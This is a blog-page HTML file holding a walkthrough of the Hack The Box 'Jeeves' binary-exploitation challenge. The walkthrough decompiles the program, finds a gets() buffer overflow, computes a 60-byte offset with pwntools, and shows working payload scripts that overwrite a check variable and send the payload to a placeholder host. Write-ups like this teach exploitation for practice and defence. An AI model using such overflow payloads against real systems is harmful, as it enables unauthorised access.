@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799059026210">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.7.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Jeeves (Easy)</title>
+    <meta name="title" content="Jeeves (Easy)">
+    <meta name="description" content="Today we take on a simple binary exploitation challenge from Hack The Box. In this post we are going to solve the Jeeves Pwn challenge from the ">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/challenges/htb-jeeves-writeup/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/challenges/htb-jeeves-writeup/">
+    <meta property="og:title" content="Jeeves (Easy)">
+    <meta property="og:description" content="Today we take on a simple binary exploitation challenge from Hack The Box. In this post we are going to solve the Jeeves Pwn challenge from the ">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/jeeves.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/challenges/htb-jeeves-writeup/">
+    <meta property="twitter:title" content="Jeeves (Easy)">
+    <meta property="twitter:description" content="Today we take on a simple binary exploitation challenge from Hack The Box. In this post we are going to solve the Jeeves Pwn challenge from the ">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/jeeves.png">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.7.0.799059026210" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799059026210" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799059026210" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799059026210" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="jeeves-easy" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#jeeves-easy">#</doc-anchor-trigger>
+        <span>Jeeves (Easy)</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/binary-exploitation/">Binary-Exploitation</a>,&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2023-09-08</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../../assets/images/headers/jeeves.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Today we take on a simple binary exploitation challenge from Hack The Box. In this post we are going to solve the Jeeves Pwn challenge from the <strong>Intro to Binary Exploitation</strong> track.</p>
+<doc-anchor-target id="running-the-program">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#running-the-program">#</doc-anchor-trigger>
+        <span>Running the program</span>
+    </h2>
+</doc-anchor-target>
+<p>We start off by running the program normally. We are given a prompt asking for our name.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ ./jeeves 
+Hello, good sir!
+May I have your name? bytebl33d
+Hello bytebl33d, hope you have a good day! </code></pre>
+</doc-codeblock></div>
+<p>The program subsequently prints a greeting message back to us. Based on this response alone, we can assume that our input is stored somewhere in a buffer.</p>
+<doc-anchor-target id="examining-the-binary-with-ghidra">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#examining-the-binary-with-ghidra">#</doc-anchor-trigger>
+        <span>Examining the binary with Ghidra</span>
+    </h2>
+</doc-anchor-target>
+<p>Let&#x27;s decompile the binary using Ghidra so that we can better understand its inner workings. After importing the binary we can analyze the <code v-pre>main</code> function:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">main(void){
+  char input [44];
+  int file;
+  void *buffer;
+  int check;
+  
+  check = -0x21523f2d;
+  printf(&quot;Hello, good sir!\nMay I have your name? &quot;);
+  gets(input);
+  printf(&quot;Hello %s, hope you have a good day!\n&quot;,input);
+  if (check == 0x1337bab3) {
+    buffer = malloc(0x100);
+    file = open(&quot;flag.txt&quot;,0);
+    read(file,buffer,0x100);
+    printf(&quot;Pleased to make your acquaintance. Here\'s a small gift: %s\n&quot;,buffer);
+    close(file);
+  }
+  return 0;
+}</code></pre>
+</doc-codeblock></div>
+<p>The user input is stored inside the input buffer with a size of 44 bytes. We also see there is a <code v-pre>flag.txt</code> file that gets opened after the if-statement that verfifies if the <code v-pre>check</code> variable is equal to the value <code v-pre>0x1337bab3</code> (or in other words &#x27;leetbabe&#x27;). However, this check is never going to succeed because the <code v-pre>check</code> variable is initialized in a different way. We therefore need to find out how to overwrite this variable on the stack.</p>
+<p>The assembly view in Ghidra shows this variable is given the hex value of <code v-pre>0xdeadc0d3</code> (since this is indeed just dead code).</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/binary-exploitation/ghidra.png" alt="ghidra">
+    <figcaption class="caption">ghidra</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="examining-the-binary-in-gdb">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#examining-the-binary-in-gdb">#</doc-anchor-trigger>
+        <span>Examining the binary in GDB</span>
+    </h2>
+</doc-anchor-target>
+<p>Loading the binary into GDB and disassembling the <code v-pre>main</code> function we get the following output:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-actionscript"><code v-pre class="language-actionscript">$ gdb jeeves
+
+pwndbg&gt; disass main
+Dump of assembler code for function main:
+   0x00000000000011e9 &lt;+0&gt;: endbr64
+   0x00000000000011ed &lt;+4&gt;: push   rbp
+   0x00000000000011ee &lt;+5&gt;: mov    rbp,rsp
+   0x00000000000011f1 &lt;+8&gt;: sub    rsp,0x40
+   0x00000000000011f5 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x4],0xdeadc0d3
+   0x00000000000011fc &lt;+19&gt;:    lea    rdi,[rip+0xe05]        # 0x2008
+   0x0000000000001203 &lt;+26&gt;:    mov    eax,0x0
+   0x0000000000001208 &lt;+31&gt;:    call   0x10a0 &lt;printf@plt&gt;
+   0x000000000000120d &lt;+36&gt;:    lea    rax,[rbp-0x40]
+   0x0000000000001211 &lt;+40&gt;:    mov    rdi,rax
+   0x0000000000001214 &lt;+43&gt;:    mov    eax,0x0
+   0x0000000000001219 &lt;+48&gt;:    call   0x10d0 &lt;gets@plt&gt;
+   0x000000000000121e &lt;+53&gt;:    lea    rax,[rbp-0x40]
+   0x0000000000001222 &lt;+57&gt;:    mov    rsi,rax
+   0x0000000000001225 &lt;+60&gt;:    lea    rdi,[rip+0xe04]        # 0x2030
+   0x000000000000122c &lt;+67&gt;:    mov    eax,0x0
+   0x0000000000001231 &lt;+72&gt;:    call   0x10a0 &lt;printf@plt&gt;</code></pre>
+</doc-codeblock></div>
+<p>Our task is to figure out how many bytes we have to overflow the buffer in order to overwrite the <code v-pre>check</code> variable. Lets&#x27;s set a breakpoint right after the <code v-pre>gets</code> call and run the program (just enter some A&#x27;s as our input):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-actionscript"><code v-pre class="language-actionscript">pwndbg&gt; b *main+53
+pwndbg&gt; r
+
+&lt;SNIP&gt;
+
+*RBP  0x7fffffffdec0 ◂— 0x1
+*RSP  0x7fffffffde80 ◂— 'AAAAAAAAAA'
+*RIP  0x55555555521e (main+53) ◂— lea rax, [rbp - 0x40]
+────────────────────────────────────[ DISASM / x86-64 / set emulate on ] ────────────────────────────────────────────────
+ ► 0x55555555521e &lt;main+53&gt;     lea    rax, [rbp - 0x40]
+   0x555555555222 &lt;main+57&gt;     mov    rsi, rax
+   0x555555555225 &lt;main+60&gt;     lea    rdi, [rip + 0xe04]
+   0x55555555522c &lt;main+67&gt;     mov    eax, 0
+   0x555555555231 &lt;main+72&gt;     call   printf@plt              &lt;printf@plt&gt;
+   0x555555555236 &lt;main+77&gt;     cmp    dword ptr [rbp - 4], 0x1337bab3
+   0x55555555523d &lt;main+84&gt;     jne    main+191                &lt;main+191&gt;
+   0x55555555523f &lt;main+86&gt;     mov    edi, 0x100
+   0x555555555244 &lt;main+91&gt;     call   malloc@plt              &lt;malloc@plt&gt;
+   0x555555555249 &lt;main+96&gt;     mov    qword ptr [rbp - 0x10], rax
+   0x55555555524d &lt;main+100&gt;    mov    esi, 0</code></pre>
+</doc-codeblock></div>
+<p>Looking at the RIP (Instruction Pointer) above, we can see that it is comparing <code v-pre>dword ptr [rbp - 4]</code> with <code v-pre>0x1337bab3</code>. Let&#x27;s have a look at the value of <code v-pre>rbp-4</code> in GDB.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; x/x $rbp-4 
+0x7fffffffdebc: 0xdeadc0d3</code></pre>
+</doc-codeblock></div>
+<p>To see what happens when we change this variable, we can try to change it using <code v-pre>pwndbg</code> and continue running the program. Pwndbg is just a handy GDB plug-in that makes debugging with GDB easier for reverse-engineering tasks.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; set *0x7fffffffdebc = 0x1337bab3
+pwndbg&gt; x/x $rbp-4
+0x7fffffffdebc: 0x1337bab3
+pwndbg&gt; c
+Continuing.
+Hello AAAAAAAAAA, hope you have a good day!
+Pleased to make your acquaintance. Here's a small gift: 
+[Inferior 1 (process 13162) exited normally]</code></pre>
+</doc-codeblock></div>
+<p>Looking at the output we can see that if we are able to change the variable to <code v-pre>0x1337bab3</code>, we receive a small gift. This is probably the flag we are looking for.</p>
+<doc-anchor-target id="the-exploitation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#the-exploitation">#</doc-anchor-trigger>
+        <span>The Exploitation</span>
+    </h2>
+</doc-anchor-target>
+<p>Using python3 we can find the offset by generating a pattern and running the program with this input. To make our lifes a bit easier, we can do this with the <code v-pre>pwntools</code> package as follows:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwn cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</code></pre>
+</doc-codeblock></div>
+<p>We run the program again with the created pattern and inspect <code v-pre>rbp-4</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; x/x $rbp-4 
+0x7fffffffdebc: 0x61616170      # this is paaa in ASCII</code></pre>
+</doc-codeblock></div>
+<p>We see that the variable now gets overwritting with <code v-pre>paaa</code>. Finding the offset is as easy as just using the <code v-pre>cyclic_find</code> function from <code v-pre>pwntools</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">$ python3
+&gt;&gt;&gt; from pwn import *
+&gt;&gt;&gt; cyclic(100)
+&gt;&gt;&gt; cyclic_find('paaa')
+&gt;&gt;&gt; 60</code></pre>
+</doc-codeblock></div>
+<p>So our final payload will be: <code v-pre>A*60 + 0x1337bab3</code>.</p>
+<doc-anchor-target id="crafting-our-payload">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#crafting-our-payload">#</doc-anchor-trigger>
+        <span>Crafting our payload</span>
+    </h3>
+</doc-anchor-target>
+<p>Now we have all the information to craft our payload.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+check = p64(0x1337bab3)
+payload = b&quot;A&quot;*60 + check
+
+print(payload)</code></pre>
+</doc-codeblock></div>
+<p>Or we can run it directly in GDB to test our payload first:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; r &lt;&lt;&lt; $(python3 -c 'import sys; sys.stdout.buffer.write(b&quot;A&quot;*60 + b&quot;\xb3\xba\x37\x13&quot;)')</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="executing-our-payload-on-the-target">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#executing-our-payload-on-the-target">#</doc-anchor-trigger>
+        <span>Executing our payload on the target</span>
+    </h2>
+</doc-anchor-target>
+<p>Here we will show 2 ways of executing our payload. The first method is a manual approach, while the other is a more automated way using <code v-pre>pwntools</code>.</p>
+<doc-anchor-target id="method-1-manual">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-1-manual">#</doc-anchor-trigger>
+        <span>Method 1 (manual)</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">nc &lt;IP_ADDRESS&gt; &lt;PORT&gt; &lt;&lt;&lt; $(python3 -c 'import sys; sys.stdout.buffer.write(b&quot;A&quot;*60 + b&quot;\xb3\xba\x37\x13&quot;)')</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="method-2-pwntools">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-2-pwntools">#</doc-anchor-trigger>
+        <span>Method 2 (pwntools)</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+target = process(b&quot;nc&quot;)
+target.sendline(b&quot;&lt;IP_ADDRESS&gt; &lt;PORT&gt;&quot;)
+
+payload = b&quot;A&quot;*60
+payload += p64(0x1337bab3)
+
+target.sendline(payload)
+
+print(target.recvuntil(b&quot;}&quot;))</code></pre>
+</doc-codeblock></div>
+<p>Running our exploit code:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ python3 exploit.py
+[+] Starting local process '/usr/bin/nc': pid 20136
+b&quot;Cmd line: Hello, good sir!
+May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13, hope you have a good day!
+Pleased to make your acquaintance. Here's a small gift: HTB{w3*****************!}&quot;
+[*] Process '/usr/bin/nc' stopped with exit code 0 (pid 20136)</code></pre>
+</doc-codeblock></div>
+<p>After running our exploit, we indeed get the flag back. We have successfully completed our first pwn challenge in the Intro to Binary Exploitation track.</p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Jeeves (Easy)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
